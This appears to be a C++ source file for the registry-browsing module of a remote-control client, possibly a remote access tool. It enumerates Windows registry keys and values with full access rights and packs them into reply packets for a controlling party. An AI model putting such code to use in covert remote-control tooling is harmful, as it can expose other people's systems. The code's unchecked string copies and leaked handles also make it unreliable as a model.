#include "Register.h"


CRegister::CRegister(char  IsToken)
{
	switch (IsToken)
	{
	case  MHKEY_CLASSES_ROOT:
		m_KeyHandle = HKEY_CLASSES_ROOT;
		break;
	case  MHKEY_CURRENT_USER:
		m_KeyHandle = HKEY_CURRENT_USER;
		break;
	case  MHKEY_LOCAL_MACHINE:
		m_KeyHandle = HKEY_LOCAL_MACHINE;
		break;
	case  MHKEY_USERS:
		m_KeyHandle = HKEY_USERS;
		break;
	case  MHKEY_CURRENT_CONFIG:
		m_KeyHandle = HKEY_CURRENT_CONFIG;
		break;
	default:
		m_KeyHandle = HKEY_LOCAL_MACHINE;
		break;
	}
	ZeroMemory(m_KeyPath, MAX_PATH);
}


CRegister::~CRegister()
{
}
void   CRegister::SetPath(char* FullPath)
{
	ZeroMemory(m_KeyPath, MAX_PATH);
	strcpy(m_KeyPath, FullPath);
}
char*  CRegister::FindPath()
{
	char*  BufferData = NULL;
	HKEY   KeyHandle;       //注册表返回句柄
	//打开注册表
	if (RegOpenKeyEx(m_KeyHandle, m_KeyPath, 0, KEY_ALL_ACCESS, &KeyHandle) == ERROR_SUCCESS)
	{
		DWORD  Index = 0, NameSize, NameCount, NameMaxLength, Type;
		DWORD  KeyLength, KeyCount, KeyMaxLength, DateSize, MaxDateLength;
		//枚举
		if (RegQueryInfoKey(KeyHandle, NULL, NULL, NULL, &KeyCount,
			&KeyMaxLength, NULL, &NameCount, &NameMaxLength, &MaxDateLength, NULL, NULL) != ERROR_SUCCESS)
		{
			return NULL;
		}
		KeyLength = KeyMaxLength + 1;
		if (KeyCount > 0 && KeyLength > 1)
		{
			int  v1 = sizeof(PACKET_HEADER) + 1;
			DWORD	BufferLength = KeyCount*KeyLength + v1 + 1;
			BufferData = (char*)LocalAlloc(LPTR, BufferLength);
			ZeroMemory(BufferData, BufferLength);
			BufferData[0] = CLIENT_REGISTER_MANAGER_PATH_DATA_REPLY;
			PACKET_HEADER  PackedHeader;
			PackedHeader.PathLength = KeyLength;
			PackedHeader.PathCount = KeyCount;
			memcpy(BufferData + 1, (void*)&PackedHeader, v1);

			char*  v2 = new  char[KeyLength];
			for(Index=0;Index<KeyCount;Index++)
			{
				ZeroMemory(v2, KeyLength);
				DWORD i = KeyLength;
				RegEnumKeyEx(KeyHandle, Index, v2, &i, NULL, NULL, NULL, NULL);
				strcpy(BufferData + Index*KeyLength + v1, v2);
			}
			delete[]  v2;
			RegCloseKey(KeyHandle);
		}
	}
	return BufferData;
}
char*  CRegister::FindKey()
{
	char*  ValueName;         //键值名称
	char*  KeyName;           //子键名称
	LPBYTE  ValueDate;        //键值数据

	char*  BufferData = NULL;
	HKEY   KeyHandle;       //注册表返回句柄
							//打开注册表
	if (RegOpenKeyEx(m_KeyHandle, m_KeyPath, 0, KEY_ALL_ACCESS, &KeyHandle) == ERROR_SUCCESS)
	{
		DWORD  Index = 0, NameCount,NameLength, NameMaxLength, Type;
		DWORD  KeyLength, KeyCount, KeyMaxLength, DateLength, MaxDateLength;
		//枚举
		if (RegQueryInfoKey(KeyHandle, NULL, NULL, NULL, &KeyCount,
			&KeyMaxLength, NULL, &NameCount, &NameMaxLength, &MaxDateLength, NULL, NULL) != ERROR_SUCCESS)
		{
			return NULL;
		}

		if (NameCount > 0 && MaxDateLength > 0 && NameMaxLength>0)
		{
			DateLength = MaxDateLength + 1;
			NameLength = NameMaxLength + 100;
			PACKET_HEADER  PackedHeader;
			PackedHeader.PathLength = NameLength;
			PackedHeader.PathCount = NameCount;
			PackedHeader.PathName = DateLength;
			int  v1 = sizeof(PACKET_HEADER);
			DWORD  BufferLength = sizeof(PACKET_HEADER) + sizeof(BYTE)*NameCount + NameLength*NameCount + DateLength*NameCount + 10;
			BufferData = (char*)LocalAlloc(LPTR, BufferLength);
			ZeroMemory(BufferData, BufferLength);
			BufferData[0] = CLIENT_REGISTER_MANAGER_KEY_DATA_REPLY;
			memcpy(BufferData + 1, (void*)&PackedHeader, v1);

			ValueDate = (LPBYTE)malloc(DateLength);
			ValueName = (char*)malloc(NameLength);

			char*  Offset = BufferData + v1 + 1;
			for (Index = 0; Index<NameCount; Index++)
			{
				ZeroMemory(ValueName, NameLength);
				ZeroMemory(ValueDate, DateLength);
				DateLength = MaxDateLength + 1;
				NameLength = NameMaxLength + 100;
				RegEnumValue(KeyHandle, Index, ValueName, &NameLength, NULL, &Type, ValueDate, &DateLength);
				if (Type == REG_SZ)
				{
					Offset[0] = MREG_SZ;
				}
				if (Type == REG_DWORD)
				{
					Offset[0] = MREG_DWORD;
				}
				if (Type == REG_BINARY)
				{
					Offset[0] = MREG_BINARY;
				}
				if (Type == REG_EXPAND_SZ)
				{
					Offset[0] = MREG_EXPAND_SZ;
				}
				Offset += sizeof(BYTE);
				strcpy(Offset, ValueName);
				Offset += PackedHeader.PathLength;
				memcpy(Offset, ValueDate, PackedHeader.PathName);
				Offset += PackedHeader.PathName;
			}
			free(ValueName);
			free(ValueDate);
		}
	}
	return BufferData;
}